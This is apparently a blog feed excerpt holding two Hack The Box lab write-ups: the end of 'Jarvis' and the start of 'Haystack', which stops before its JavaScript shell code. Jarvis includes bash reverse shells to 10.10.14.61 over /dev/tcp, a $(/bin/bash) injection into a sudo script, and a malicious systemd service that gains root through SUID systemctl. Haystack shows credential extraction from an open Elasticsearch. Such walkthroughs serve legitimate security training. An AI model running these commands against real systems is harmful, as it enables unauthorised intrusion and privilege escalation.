&lt;p&gt;The function filters certain commands to prevent us from injecting naughty things into it. It does not, however, filter out the &lt;code class=&quot;highlighter-rouge&quot;&gt;$&lt;/code&gt; character which means we can encapsulate a bash command.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;A bash command can then be encapsulated using the $()
     technique.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Source:&lt;/strong&gt; &lt;a href=&quot;https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html&quot;&gt;PacketStorm&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Even though we are the &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; user, we’re able to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;simpler.py&lt;/code&gt; as the &lt;code class=&quot;highlighter-rouge&quot;&gt;pepper&lt;/code&gt; like such,&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;www-data@jarvis:/var/www/Admin-Utilities$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; pepper ./simpler.py &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enter &lt;code class=&quot;highlighter-rouge&quot;&gt;$(/bin/bash)&lt;/code&gt; into the prompt for the &lt;code class=&quot;highlighter-rouge&quot;&gt;-p&lt;/code&gt; command to spawn a shell as the &lt;code class=&quot;highlighter-rouge&quot;&gt;pepper&lt;/code&gt; user. What was odd is that this new shell did not return anything to the screen. Meaning commands like &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;pwd&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; returned nothing. Perhaps someone else could explain why this was for me?&lt;/p&gt;

&lt;p&gt;Anyway, we can spawn another reverse shell as the &lt;code class=&quot;highlighter-rouge&quot;&gt;pepper&lt;/code&gt; user now though via &lt;code class=&quot;highlighter-rouge&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.61/6666 0&amp;gt;&amp;amp;1&lt;/code&gt;. With this shell we can grab &lt;code class=&quot;highlighter-rouge&quot;&gt;cat user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/user_flag.png&quot; alt=&quot;user flag.&quot; /&gt;
&lt;strong&gt;Figure 10:&lt;/strong&gt; user flag &lt;strong&gt;&lt;em&gt;2afa36c4f05b37b34259c93551f5c44f&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;
&lt;p&gt;In order to escalate our privileges from &lt;code class=&quot;highlighter-rouge&quot;&gt;pepper&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;, we first need to check which binaries have the SUID bit flipped, meaning they run as the owner, not the user who started them.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;find / -perm -u=s -type f 2&amp;gt;&lt;/span&gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The above returns many programs from the &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin&lt;/code&gt; directory. So lets check up the permissions of the binaries in that directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/systemctl_misconfig.png&quot; alt=&quot;user flag.&quot; /&gt;
&lt;strong&gt;Figure 11:&lt;/strong&gt; Look who owns systemctl!&lt;/p&gt;

&lt;h3 id=&quot;privilege-escalation-a-proper-shell&quot;&gt;Privilege Escalation: A proper shell&lt;/h3&gt;
&lt;p&gt;In order to exploit &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl&lt;/code&gt; we need a proper shell. The below method does not function on a reverse shell, as we cannot enable services through it. This was discovered via trial and error, and I can’t explain exactly as to why.&lt;/p&gt;

&lt;p&gt;To get the shell we need we’re simply going to take the public key we’ve got on our apache server and copy it into &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.ssh/authorized_keys&lt;/code&gt;. It may be the case that we need to create this directory and file, if no other HTB users have done it since the box has been reset.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;pepper@jarvis:~/.ssh$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
&lt;span class=&quot;go&quot;&gt;cd /tmp
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;pepper@jarvis:/tmp$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;wget http://10.10.14.61/id_rsa.pub
&lt;span class=&quot;go&quot;&gt;wget http://10.10.14.61/id_rsa.pub
--2019-07-23 21:29:15--  http://10.10.14.61/id_rsa.pub
Connecting to 10.10.14.61:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 391
Saving to: 'id_rsa.pub'

     0K                                                       100% 91.7M=0s

2019-07-23 21:29:16 (91.7 MB/s) - 'id_rsa.pub' saved [391/391]

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;pepper@jarvis:/tmp$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;id_rsa.pub &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; ~/.ssh/authorized_keys
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/ssh_pepper.png&quot; alt=&quot;ssh as pepper.&quot; /&gt;
&lt;strong&gt;Figure 12:&lt;/strong&gt; SSH’ing in directly using our public key.&lt;/p&gt;

&lt;h3 id=&quot;exploiting-systemctl&quot;&gt;Exploiting systemctl&lt;/h3&gt;

&lt;p&gt;Since we know that the &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl&lt;/code&gt; binary is going to be run as &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;, let’s create our own service to call a reverse shell (as root!).&lt;/p&gt;

&lt;p&gt;First we create our script to call a reverse shell, we’ll call it &lt;code class=&quot;highlighter-rouge&quot;&gt;shelly.sh&lt;/code&gt;. This time we have netcat listening on port &lt;code class=&quot;highlighter-rouge&quot;&gt;7777&lt;/code&gt;. We also need to &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod +x /tmp/shelly.sh&lt;/code&gt; so that it’s executable.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash  &lt;/span&gt;
bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.10.14.61/7777 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next we create &lt;code class=&quot;highlighter-rouge&quot;&gt;revshell_root.service&lt;/code&gt; to execute our reverse shell as root.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Unit]
Description=root shell

[Service]
ExecStart=/tmp/shelly.sh

[Install]
WantedBy=multi-user.target
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once &lt;code class=&quot;highlighter-rouge&quot;&gt;shelly.sh&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;revshell_root.service&lt;/code&gt; are in the &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory, we enable the services through &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl&lt;/code&gt;, and then start the service. Upon starting the service our reverse shell is triggered, and we’re root!&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;pepper@jarvis:/tmp$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; /tmp/revshell_root.service
&lt;span class=&quot;go&quot;&gt;Created symlink /etc/systemd/system/multi-user.target.wants/revshell_root.service → /tmp/revshell_root.service.
Created symlink /etc/systemd/system/revshell_root.service → /tmp/revshell_root.service.
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;pepper@jarvis:/tmp$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;systemctl start revshell_root.service
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/07/jarvis/rooted.png&quot; alt=&quot;rooted.&quot; /&gt;
&lt;strong&gt;Figure 13:&lt;/strong&gt; Root Shell&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@jarvis:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
&lt;span class=&quot;go&quot;&gt;cat root.txt
d41d8cd98f00b204e9800998ecf84271
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;I learned a lot from this box. I learned just how powerful a tool &lt;code class=&quot;highlighter-rouge&quot;&gt;sqlmap&lt;/code&gt; is. I’m very new to using this tool, and apparently I could have used it to spawn a shell directly. Perhaps I wouldn’t have needed to exploit phpmyadmin in this case? That’s something I’ll certainly look into next.&lt;/p&gt;

&lt;p&gt;This box also taught me a little more about &lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl&lt;/code&gt; and the syntax to create and run new services.&lt;/p&gt;

&lt;p&gt;I’m really interested in reading other people’s writeups to see what other methods could be used to root this box. Jarvis seemed to have many different solutions, which is very cool. I’m excited to see if the LLMNR port came into play at all for anyone, what other methods people used to gain their initial foothold, and how many different ways there were for escalating privileges from &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;pepper&lt;/code&gt;, and from &lt;code class=&quot;highlighter-rouge&quot;&gt;pepper&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2018-12613&quot;&gt;https://nvd.nist.gov/vuln/detail/CVE-2018-12613&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/&quot;&gt;https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://security.stackexchange.com/questions/212427/why-doesnt-my-systemctl-command-work&quot;&gt;https://security.stackexchange.com/questions/212427/why-doesnt-my-systemctl-command-work&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html&quot;&gt;https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot;&gt;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="phpMyAdmin" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Haystack</title><link href="http://0.0.0.0:4000/hack-the-box-haystack-writeup/" rel="alternate" type="text/html" title="Hack The Box - Haystack" /><published>2019-11-02T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-haystack</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-haystack-writeup/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/badge.png&quot; alt=&quot;Hack The Box Haystack&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;intro&quot;&gt;Intro&lt;/h1&gt;
&lt;p&gt;Haystack is retired and now we can talk about it. At first I was fairly frustrated with this box. I really didn’t enjoy it much at the beginning, but after all was said and done I did have a bit of fun. The Spanish language was a nice twist, we have to remember there are a lot of systems out there that aren’t in English. I learned a bit about the ELK stack, which before this I knew next to nothing about. All in all it was a fairly good box.&lt;/p&gt;

&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
&lt;h2 id=&quot;port-scan-nmap&quot;&gt;Port Scan: Nmap&lt;/h2&gt;
&lt;p&gt;We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:/media/sf_Research#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sVC&lt;/span&gt; 10.10.10.115
&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-26 18:48 EDT
Nmap scan report for 10.10.10.115
Host is up (0.38s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
| http-methods:
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;|_http-title: Site doesn't have a title (application/json;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.42 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ports open &lt;strong&gt;22&lt;/strong&gt;, &lt;strong&gt;80&lt;/strong&gt;, and &lt;strong&gt;9200&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;the-needle-port-80&quot;&gt;The Needle: Port 80&lt;/h2&gt;
&lt;p&gt;We see that there’s an Nginix page hosting only an image. This is a CTF after all, so let’s check and see if there’s anything hidden in this picture.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/port80.png&quot; alt=&quot;Port 80&quot; /&gt;
&lt;strong&gt;Figure 1:&lt;/strong&gt; needle.jpg displayed on port 80.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Desktop#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;strings &lt;span class=&quot;nt&quot;&gt;-10&lt;/span&gt; needle.jpg
&lt;span class=&quot;go&quot;&gt;paint.net 4.1.1
%&amp;amp;'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&amp;amp;'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;S&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;M7&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;Y
&lt;span class=&quot;gp&quot;&gt;WEL/;&lt;/span&gt;wg-J3
&lt;span class=&quot;go&quot;&gt;T.-UWuvFG,
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Euw!i$&lt;/span&gt;goRk
&lt;span class=&quot;gp&quot;&gt;5)5=FI$&lt;/span&gt;b[&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;+
&lt;span class=&quot;gp&quot;&gt;*Oo!;&lt;/span&gt;.o|?&amp;gt;
&lt;span class=&quot;go&quot;&gt;bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Desktop#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--decode&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;la aguja en el pajar es &quot;clave&quot;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We see that there is a &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; encoded string in this &lt;code class=&quot;highlighter-rouge&quot;&gt;.jpg&lt;/code&gt;. When we decode that we get the following message.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;la aguja en el pajar es “clave”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Translated to English this becomes,&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;the needle in the haystack is “key”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;they-haystack-port-9200-elasticsearch&quot;&gt;They Haystack: Port 9200 (Elasticsearch)&lt;/h2&gt;
&lt;p&gt;The Elasticsearch database is where the haystack resides. When it’s queried we see that it’s version &lt;code class=&quot;highlighter-rouge&quot;&gt;6.4.2&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:/media/sf_Research#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;curl http://10.10.10.115:9200
&lt;span class=&quot;go&quot;&gt;{
  &quot;name&quot; : &quot;iQEYHgS&quot;,
  &quot;cluster_name&quot; : &quot;elasticsearch&quot;,
  &quot;cluster_uuid&quot; : &quot;pjrX7V_gSFmJY-DxP4tCQg&quot;,
  &quot;version&quot; : {
    &quot;number&quot; : &quot;6.4.2&quot;,
    &quot;build_flavor&quot; : &quot;default&quot;,
    &quot;build_type&quot; : &quot;rpm&quot;,C
    &quot;build_hash&quot; : &quot;04711c2&quot;,
    &quot;build_date&quot; : &quot;2018-09-26T13:34:09.098244Z&quot;,
    &quot;build_snapshot&quot; : false,
    &quot;lucene_version&quot; : &quot;7.4.0&quot;,
    &quot;minimum_wire_compatibility_version&quot; : &quot;5.6.0&quot;,
    &quot;minimum_index_compatibility_version&quot; : &quot;5.0.0&quot;
  },
  &quot;tagline&quot; : &quot;You Know, for Search&quot;
}
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This version should have a local file inclusion vulnerability &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2018-17246&lt;/code&gt;, lets remember this for laster. For right now though, we need to find the information hidden in the haystack. After trying to make the query for &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;, nothing comes up. Using Spanish though, and making the query for &lt;code class=&quot;highlighter-rouge&quot;&gt;clave&lt;/code&gt;, it returns some interesting records.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Desktop#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.115:9200/_search?q=clave&quot;&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;{&quot;took&quot;:23,&quot;timed_out&quot;:false,&quot;_shards&quot;:{&quot;total&quot;:11,&quot;successful&quot;:11,&quot;skipped&quot;:0,&quot;failed&quot;:0},&quot;hits&quot;:{&quot;total&quot;:2,&quot;max_score&quot;:5.9335938,&quot;hits&quot;:[{&quot;_index&quot;:&quot;quotes&quot;,&quot;_type&quot;:&quot;quote&quot;,&quot;_id&quot;:&quot;45&quot;,&quot;_score&quot;:5.9335938,&quot;_source&quot;:{&quot;quote&quot;:&quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot;}},{&quot;_index&quot;:&quot;quotes&quot;,&quot;_type&quot;:&quot;quote&quot;,&quot;_id&quot;:&quot;111&quot;,&quot;_score&quot;:5.3459888,&quot;_source&quot;:{&quot;quote&quot;:&quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot;}}]}}
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s decode these two base64 strings and see what they’re saying.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;dXNlcjogc2VjdXJpdHkg | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--decode&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;user: security
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cGFzczogc3BhbmlzaC5pcy5rZXk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--decode&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;pass: spanish.is.key
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we have a user name and some credentials.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;

&lt;p&gt;Using the credentials found in the Elasticsearch database we’re able to ssh into the box and gain the user flag.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;[security@haystack ~]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
&lt;span class=&quot;go&quot;&gt;04d18bc79dac1d4d48ee0a940c8eb929
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;
&lt;p&gt;It may be intuitive that we’re exploiting the ELK stack here, and that the CVE is going to come into play. In order to confirm that this is the path to root, we view processes  running on the box with root permissions.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;[security@haystack tmp]$ ps -elf|grep root&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/elk_is_root.png&quot; alt=&quot;ELK is root&quot; /&gt;
&lt;strong&gt;Figure 2:&lt;/strong&gt; Logstash is running as root.&lt;/p&gt;

&lt;p&gt;It’s now clear to us that &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash&lt;/code&gt;, which is the &lt;code class=&quot;highlighter-rouge&quot;&gt;L&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;ELK&lt;/code&gt;, is running as root. When we attempt to view the current configuration files for &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash&lt;/code&gt; we see that the &lt;code class=&quot;highlighter-rouge&quot;&gt;security&lt;/code&gt; user we currently have a shell as isn’t able to read them.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;[security@haystack conf.d]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;/etc/logstash/conf.d
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[security@haystack conf.d]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;total 12
drwxrwxr-x. 2 root kibana  62 Jun 24 08:12 .
drwxr-xr-x. 3 root root   183 Jun 18 22:15 ..
-rw-r-----. 1 root kibana 131 Jun 20 10:59 filter.conf
-rw-r-----. 1 root kibana 186 Jun 24 08:12 input.conf
-rw-r-----. 1 root kibana 109 Jun 24 08:12 output.conf
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[security@haystack conf.d]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;filter.conf
&lt;span class=&quot;go&quot;&gt;cat: filter.conf: Permission denied
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;pivot-to-kibana-user&quot;&gt;Pivot to kibana user&lt;/h3&gt;

&lt;p&gt;Researching known vulnerabilities in Elasticsearch &lt;code class=&quot;highlighter-rouge&quot;&gt;6.4.2&lt;/code&gt;, we’ve come across &lt;a href=&quot;https://github.com/mpgn/CVE-2018-17246&quot;&gt;CVE-2018-17246&lt;/a&gt;. The Github user &lt;a href=&quot;https://github.com/mpgn&quot;&gt;mpgn&lt;/a&gt; has provided a proof of concept we can leverage to exploit this vulnerability for local file inclusion (LFI). This should allow us to get a shell as the user &lt;code class=&quot;highlighter-rouge&quot;&gt;kibana&lt;/code&gt;, and do more with &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash&lt;/code&gt; than we currently have permission to do.&lt;/p&gt;

&lt;p&gt;The javascript reverse shell code provided is as follows. All that’s needed for this to work out of the box is replacing our IP and port that netcat is listening on.&lt;/p&gt;

